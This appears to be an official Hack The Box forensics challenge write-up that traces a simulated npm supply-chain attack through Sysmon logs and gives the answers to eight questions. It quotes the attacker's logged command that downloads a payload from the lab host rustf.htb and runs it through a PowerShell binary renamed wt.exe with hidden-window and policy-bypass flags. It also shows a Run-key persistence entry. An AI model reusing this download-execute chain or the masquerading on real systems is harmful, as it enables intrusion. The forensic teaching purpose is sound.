![](../../assets/banner.png)

<img src='../../assets/htb.png' style='margin-left: 20px; zoom: 80%;' align=left /><font size='10'>Trust and Betrayal</font>

19<sup>th</sup> Apr 2026

Prepared By: thewildspirit

Challenge Author(s): thewildspirit

Difficulty: <font color=green>Easy</font>

Classification: Official

# Synopsis

Trust and Betrayal is a very easy forensics challenge that involves the analysis of the recent supply chain attack involving the Axios package.

## Description

A malicious entity was detected infiltrating our systems. After a quick investigation it was determined that everything started when we installed our VeldoriaPanel in our system. Can you investigate what exactly happened?

## Skills Required

- Familiarity with Event Logs
- Familiarity with Sysmon

## Skills Learned

- Detecting supply chain attacks
- Analyzing malicious PowerShell scripts 
- Analyzing Event logs
# Solution

Players are provided with KAPE outputs to analyze as artifacts.

### [1/8] What is the filename of the malicious file that executed the first stage of the attack? 

To investigate this incident, we need to dig into the evidence. Based on the initial scenario, the `VeldoriaPanel` directory looks like the primary entry point for the malware. To verify this and piece together exactly what happened, we are going to pivot to the Sysmon logs for a detailed look at the system's activity.

We'll use a quick Python script to sift through the noise. By parsing the logs and isolating every entry that mentions Veldoria, we can map out the attacker's initial footprint and get a crystal-clear view of the infection chain as it unfolded.

```py
python3 -c "
import evtx, json
parser = evtx.PyEvtxParser('Microsoft-Windows-Sysmon%4Operational.evtx')
for record in parser.records_json():
    raw = record['data']
    if 'veldoria' in raw.lower():
        print(raw)
        print('='*60)
"
```

We can pretty quickly notice a very suspicious command being executed:
```ps1
"\"C:\\Windows\\System32\\cmd.exe\" /c curl -s -X POST -d \"packages.npm.org/product1\" \"http://rustf.htb:8000/payload6202033\" > \"C:\\Users\\DEVELO~1\\AppData\\Local\\Temp\\6202033.ps1\" & \"C:\\ProgramData\\wt.exe\" -w hidden -ep bypass -file \"C:\\Users\\DEVELO~1\\AppData\\Local\\Temp\\6202033.ps1\" \"http://rustf.htb:8000/payload6202033\" & del \"C:\\Users\\DEVELO~1\\AppData\\Local\\Temp\\6202033.ps1\" /f"
```
By the PID 5284 with Parent Process ID 5792 (cscript.exe).

```json
 "EventData": {
      "RuleName": "-",
      "UtcTime": "2026-05-07 16:58:42.342",
      "ProcessGuid": "5BB49AFA-C4C2-69FC-FD00-000000001500",
      "ProcessId": 5284,
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "FileVersion": "10.0.26100.4202 (WinBuild.160101.0800)",
      "Description": "Windows Command Processor",
      "Product": "Microsoft® Windows® Operating System",
      "Company": "Microsoft Corporation",
      "OriginalFileName": "Cmd.Exe",
      "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c curl -s -X POST -d \"packages.npm.org/product1\" \"http://rustf.htb:8000/payload6202033\" > \"C:\\Users\\DEVELO~1\\AppData\\Local\\Temp\\6202033.ps1\" & \"C:\\ProgramData\\wt.exe\" -w hidden -ep bypass -file \"C:\\Users\\DEVELO~1\\AppData\\Local\\Temp\\6202033.ps1\" \"http://rustf.htb:8000/payload6202033\" & del \"C:\\Users\\DEVELO~1\\AppData\\Local\\Temp\\6202033.ps1\" /f",
      "CurrentDirectory": "C:\\Users\\developer\\Documents\\VeldoriaPanel\\node_modules\\simple-crypto-js\\",
      "User": "WIN-1VE69EPCP1O\\developer",
      "LogonGuid": "5BB49AFA-C3AB-69FC-6202-030000000000",
      "LogonId": "0x30262",
      "TerminalSessionId": 1,
      "IntegrityLevel": "High",
      "Hashes": "MD5=621CE4969D075555A5FA392020A70AF4,SHA256=F19653F003D2FD2046BF6CCC3FDB2D182E9B2CFCFF62C0A4155A31F4CCFDF53A,IMPHASH=4E4BD045D7AA40BF798F4D85F28D0A0F",
      "ParentProcessGuid": "5BB49AFA-C4C2-69FC-FC00-000000001500",
      "ParentProcessId": 5792,
      "ParentImage": "C:\\Windows\\System32\\cscript.exe",
      "ParentCommandLine": "cscript  \"C:\\Users\\DEVELO~1\\AppData\\Local\\Temp\\6202033.vbs\" //nologo",
      "ParentUser": "WIN-1VE69EPCP1O\\developer"
    }
```
If we retrace the steps we can see that the PID 5792 has parent PID 4432 (cmd.exe)

```json
"EventData": {
      "RuleName": "-",
      "UtcTime": "2026-05-07 16:58:42.157",
      "ProcessGuid": "5BB49AFA-C4C2-69FC-FC00-000000001500",
      "ProcessId": 5792,
      "Image": "C:\\Windows\\System32\\cscript.exe",
      "FileVersion": "5.812.10240.16384",
      "Description": "Microsoft ® Console Based Script Host",
      "Product": "Microsoft ® Windows Script Host",
      "Company": "Microsoft Corporation",
      "OriginalFileName": "cscript.exe",
      "CommandLine": "cscript  \"C:\\Users\\DEVELO~1\\AppData\\Local\\Temp\\6202033.vbs\" //nologo",
      "CurrentDirectory": "C:\\Users\\developer\\Documents\\VeldoriaPanel\\node_modules\\simple-crypto-js\\",
      "User": "WIN-1VE69EPCP1O\\developer",
      "LogonGuid": "5BB49AFA-C3AB-69FC-6202-030000000000",
      "LogonId": "0x30262",
      "TerminalSessionId": 1,
      "IntegrityLevel": "High",
      "Hashes": "MD5=789553E14498002E96B27112639B04EA,SHA256=6303761074991ABDE2A47202897B26511B60FFD99F823FFD275647C1084B613B,IMPHASH=146214E42B58C8FD63D228B0DF83CC73",
      "ParentProcessGuid": "5BB49AFA-C4C2-69FC-FB00-000000001500",
      "ParentProcessId": 4432,
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentCommandLine": "C:\\WINDOWS\\system32\\cmd.exe /d /s /c \"cscript \"C:\\Users\\DEVELO~1\\AppData\\Local\\Temp\\6202033.vbs\" //nologo && del \"C:\\Users\\DEVELO~1\\AppData\\Local\\Temp\\6202033.vbs\" /f\"",
      "ParentUser": "WIN-1VE69EPCP1O\\developer"
    }
```
And if we trace the PPID of cmd.exe we will notice that it is the node process with arguments node.exe setup.js. Everything takes place in the same folder `C:\\Users\\developer\\Documents\\VeldoriaPanel\\node_modules\\simple-crypto-js`.

```json
  "RuleName": "-",
      "UtcTime": "2026-05-07 16:58:42.135",
      "ProcessGuid": "5BB49AFA-C4C2-69FC-FB00-000000001500",
      "ProcessId": 4432,
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "FileVersion": "10.0.26100.4202 (WinBuild.160101.0800)",
      "Description": "Windows Command Processor",
      "Product": "Microsoft® Windows® Operating System",
      "Company": "Microsoft Corporation",
      "OriginalFileName": "Cmd.Exe",
      "CommandLine": "C:\\WINDOWS\\system32\\cmd.exe /d /s /c \"cscript \"C:\\Users\\DEVELO~1\\AppData\\Local\\Temp\\6202033.vbs\" //nologo && del \"C:\\Users\\DEVELO~1\\AppData\\Local\\Temp\\6202033.vbs\" /f\"",
      "CurrentDirectory": "C:\\Users\\developer\\Documents\\VeldoriaPanel\\node_modules\\simple-crypto-js\\",
      "User": "WIN-1VE69EPCP1O\\developer",
      "LogonGuid": "5BB49AFA-C3AB-69FC-6202-030000000000",
      "LogonId": "0x30262",
      "TerminalSessionId": 1,
      "IntegrityLevel": "High",
      "Hashes": "MD5=621CE4969D075555A5FA392020A70AF4,SHA256=F19653F003D2FD2046BF6CCC3FDB2D182E9B2CFCFF62C0A4155A31F4CCFDF53A,IMPHASH=4E4BD045D7AA40BF798F4D85F28D0A0F",
      "ParentProcessGuid": "5BB49AFA-C4C1-69FC-F700-000000001500",
      "ParentProcessId": 4236,
      "ParentImage": "C:\\Program Files\\nodejs\\node.exe",
      "ParentCommandLine": "node  setup.js",
      "ParentUser": "WIN-1VE69EPCP1O\\developer"
    }
```

* Answer: setup.js

### [2/8] What is the name of the malicious library or package that contained the file identified in the previous question?

We can find the answer by looking back at the last log entry we analyzed. When we examine the execution path for the node setup.js command, it points directly to C:\Users\developer\Documents\VeldoriaPanel\node_modules\simple-crypto-js\.

Since the node_modules folder is where all project dependencies are stored after an installation, the location of this script is straight-forward. It confirms that simple-crypto-js was the specific module carrying the malicious payload.

* Answer: `simple-crypto-js`

### [3/8] What is the name of the top-level package that was compromised by pulling in the malicious dependency?

Now that we have pinned down the path to setup.js, it is time to head over to our KAPE evidence for more answers. Inside the VeldoriaPanel project folder, we find a high-value forensic artifact: the package-lock.json file.

In the world of Node.js development, this file is a goldmine for investigators. While a standard manifest only shows top-level dependencies, the lockfile captures the entire dependency tree, showing us exactly how every package was resolved and more importantly which legitimate package brought our malicious intruder along for the ride.

```json
    "node_modules/axios": {
      "version": "1.14.1",
      "resolved": "http://192.168.128.1:4873/axios/-/axios-1.14.1.tgz",
      "integrity": "sha512-AjjcwMqE1ms/hvk3zdqWSzBmloiRU9b5Pp0H+IwtT7teUuPaRiChe0THa/i2e8uzCkzc8vX7erqcvX1sdmS+EA==",
      "license": "MIT",
      "dependencies": {
        "follow-redirects": "^1.15.11",
        "form-data": "^4.0.5",
        "proxy-from-env": "^2.1.0",
        "simple-crypto-js": "4.2.1"
      }
    }
```
We can clearly see that `simple-crypto-js` is a dependecny for the axios module.

* Answer: `axios`

### [4/8] What is the fully qualified domain name (FQDN) used for data exfiltration or payload retrieval?


From the command we analyzed earlier we can find the domain used by the attacker for their C2 server.

#### Phase A: Data Exfiltration and Payload Acquisition

 ```ps1
 curl -s -X POST -d \"packages.npm.org/product1\" \"http://rustf.htb:8000/payload6202033\"
 ```
 The attacker uses curl to perform a stealthy (-s for silent) POST request to a domain `rustf.htb`.

 #### Phase B: Obfuscated Execution (Masquerading)

 ```ps1
 "C:\ProgramData\wt.exe" -w hidden -ep bypass -file "C:\...\6202033.ps1"
 ```
 This is the most significant forensic anomaly. While named wt.exe (the legitimate name for Windows Terminal), the binary is located in the non-standard C:\ProgramData\ directory.

 #### Phase C: Anti-Forensic Cleanup

 ```ps1
 del "C:\Users\DEVELO~1\AppData\Local\Temp\6202033.ps1" /f
 ```
Immediately following execution, the attacker attempts to delete the downloaded script (/f to force delete) to minimize the footprint.


* Answer: `rustf.htb`

### [5/8] What is the filename of the VBScript used to execute the next stage of the attack?

From the aforementioned logs and the command we found earlier from the logs, we can see that the malicious vbs file is:

```ps1
"ParentCommandLine": "C:\\WINDOWS\\system32\\cmd.exe /d /s /c \"cscript \"C:\\Users\\DEVELO~1\\AppData\\Local\\Temp\\6202033.vbs\" //nologo && del \"C:\\Users\\DEVELO~1\\AppData\\Local\\Temp\\6202033.vbs\" /f\"",
```

* Answer: 6202033.vbs.

### [6/8] What was the original name of the binary before it was renamed by the attacker to evade detection?

As we dig deeper into the logs, we can see a clear red flag: the wt.exe executable is running from an irregular location `C:\ProgramData\`. While wt.exe is the legitimate name for the Windows Terminal binary, seeing it outside of its standard System32 or WindowsApps directory is a classic sign of masquerading.

The behavior of the process confirms our suspicions. The command line includes arguments like -ep bypass and -w hidden, which are specific to PowerShell, not the Windows Terminal.

```ps1
EventData": {
      "RuleName": "-",
      "UtcTime": "2026-05-07 16:58:42.573",
      "ProcessGuid": "5BB49AFA-C4C2-69FC-0101-000000001500",
      "ProcessId": 4540,
      "Image": "C:\\ProgramData\\wt.exe",
      "FileVersion": "10.0.26100.3323 (WinBuild.160101.0800)",
      "Description": "Windows PowerShell",
      "Product": "Microsoft® Windows® Operating System",
      "Company": "Microsoft Corporation",
      "OriginalFileName": "PowerShell.EXE",
      "CommandLine": "\"C:\\ProgramData\\wt.exe\"  -w hidden -ep bypass -file \"C:\\Users\\DEVELO~1\\AppData\\Local\\Temp\\6202033.ps1\" \"http://rustf.htb:8000/payload6202033\"",
      "CurrentDirectory": "C:\\Users\\developer\\Documents\\VeldoriaPanel\\node_modules\\simple-crypto-js\\",
      "User": "WIN-1VE69EPCP1O\\developer",
      "LogonGuid": "5BB49AFA-C3AB-69FC-6202-030000000000",
      "LogonId": "0x30262",
      "TerminalSessionId": 1,
      "IntegrityLevel": "High",
      "Hashes": "MD5=0FB9754BDDD637FAA0C6CE313CCE3463,SHA256=36C5781EAB906A70051434F004CF2B5DEE902C9DCE520BA68183183D36A9B472,IMPHASH=68A9FF9C8D0D4655E46E1A7A190A41D2",
      "ParentProcessGuid": "5BB49AFA-C4C2-69FC-FD00-000000001500",
      "ParentProcessId": 5284,
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c curl -s -X POST -d \"packages.npm.org/product1\" \"http://rustf.htb:8000/payload6202033\" > \"C:\\Users\\DEVELO~1\\AppData\\Local\\Temp\\6202033.ps1\" & \"C:\\ProgramData\\wt.exe\" -w hidden -ep bypass -file \"C:\\Users\\DEVELO~1\\AppData\\Local\\Temp\\6202033.ps1\" \"http://rustf.htb:8000/payload6202033\" & del \"C:\\Users\\DEVELO~1\\AppData\\Local\\Temp\\6202033.ps1\" /f",
      "ParentUser": "WIN-1VE69EPCP1O\\developer"
```
From this entry we can find the md5hash of the `wt.exe` executable. If we search for in in [virus total](https://www.virustotal.com/gui/file/36c5781eab906a70051434f004cf2b5dee902c9dce520ba68183183d36a9b472) we will find that it is indeed Powershell.exe.

* Answer: `Powershell.exe`

### [7/8] Based on the initial entry point you identified, what is the MITRE ATT&CK Technique ID for this specific method of compromise?

From the sysmon logs we can see that the `node setup.js` command is the child process of the PID 3272.

```json
 "EventData": {
      "RuleName": "-",
      "UtcTime": "2026-05-07 16:58:41.821",
      "ProcessGuid": "5BB49AFA-C4C1-69FC-F500-000000001500",
      "ProcessId": 6828,
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "FileVersion": "10.0.26100.4202 (WinBuild.160101.0800)",
      "Description": "Windows Command Processor",
      "Product": "Microsoft® Windows® Operating System",
      "Company": "Microsoft Corporation",
      "OriginalFileName": "Cmd.Exe",
      "CommandLine": "C:\\WINDOWS\\system32\\cmd.exe /d /s /c node setup.js",
      "CurrentDirectory": "C:\\Users\\developer\\Documents\\VeldoriaPanel\\node_modules\\simple-crypto-js\\",
      "User": "WIN-1VE69EPCP1O\\developer",
      "LogonGuid": "5BB49AFA-C3AB-69FC-6202-030000000000",
      "LogonId": "0x30262",
      "TerminalSessionId": 1,
      "IntegrityLevel": "High",
      "Hashes": "MD5=621CE4969D075555A5FA392020A70AF4,SHA256=F19653F003D2FD2046BF6CCC3FDB2D182E9B2CFCFF62C0A4155A31F4CCFDF53A,IMPHASH=4E4BD045D7AA40BF798F4D85F28D0A0F",
      "ParentProcessGuid": "5BB49AFA-C49C-69FC-EF00-000000001500",
      "ParentProcessId": 3272,
      "ParentImage": "C:\\Program Files\\nodejs\\node.exe",
      "ParentCommandLine": "\"C:\\Program Files\\nodejs\\node.exe\" \"C:\\Program Files\\nodejs/node_modules/npm/bin/npm-cli.js\" install",
      "ParentUser": "WIN-1VE69EPCP1O\\developer"
    }
```

Looking closer at process 3272, we see it is a standard npm install command. This perfectly aligns with the incident description: a developer simply tried to set up an internal application, only to have their system compromised in the process.

As our investigation revealed, the axios module was carrying a hidden, malicious dependency. This is the textbook definition of a Supply Chain Attack, where an attacker compromises a trusted third-party component to gain access to their real targets.

In the MITRE ATT&CK framework, this technique is categorized as:

* Answer: `T1195.002`

### [8/8] What is the Registry Key (including the Hive) that was modified to establish persistence for the malicious binary?

To answer this question we will search the sysmon logs and see if the wt.exe process has any relation to any registry keys.
With a simple python script we can find such entries.
```py
python3 -c "
import evtx, json
parser = evtx.PyEvtxParser('Microsoft-Windows-Sysmon%4Operational.evtx')
for record in parser.records_json():
    raw = record['data']
    if 'wt.exe' in raw.lower():
        print(raw)
        print('='*60)
"
```
One entry like this is the following:
```json
{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "System": {
      "Provider": {
        "#attributes": {
          "Name": "Microsoft-Windows-Sysmon",
          "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
        }
      },
      "EventID": 13,
      "Version": 2,
      "Level": 4,
      "Task": 13,
      "Opcode": 0,
      "Keywords": "0x8000000000000000",
      "TimeCreated": {
        "#attributes": {
          "SystemTime": "2026-05-07T16:58:47.962112Z"
        }
      },
      "EventRecordID": 426,
      "Correlation": null,
      "Execution": {
        "#attributes": {
          "ProcessID": 3860,
          "ThreadID": 4632
        }
      },
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "WIN-1VE69EPCP1O",
      "Security": {
        "#attributes": {
          "UserID": "S-1-5-18"
        }
      }
    },
    "EventData": {
      "RuleName": "T1060,RunKey",
      "EventType": "SetValue",
      "UtcTime": "2026-05-07 16:58:47.956",
      "ProcessGuid": "5BB49AFA-C4C2-69FC-0101-000000001500",
      "ProcessId": 4540,
      "Image": "C:\\ProgramData\\wt.exe",
      "TargetObject": "HKU\\S-1-5-21-1951309463-2880286089-3258862196-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MicrosoftUpdate",
      "Details": "C:\\ProgramData\\system.bat",
      "User": "WIN-1VE69EPCP1O\\developer"
    }
  }
}
```

* Answer: `HKU\S-1-5-21-1951309463-2880286089-3258862196-1001\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdate`
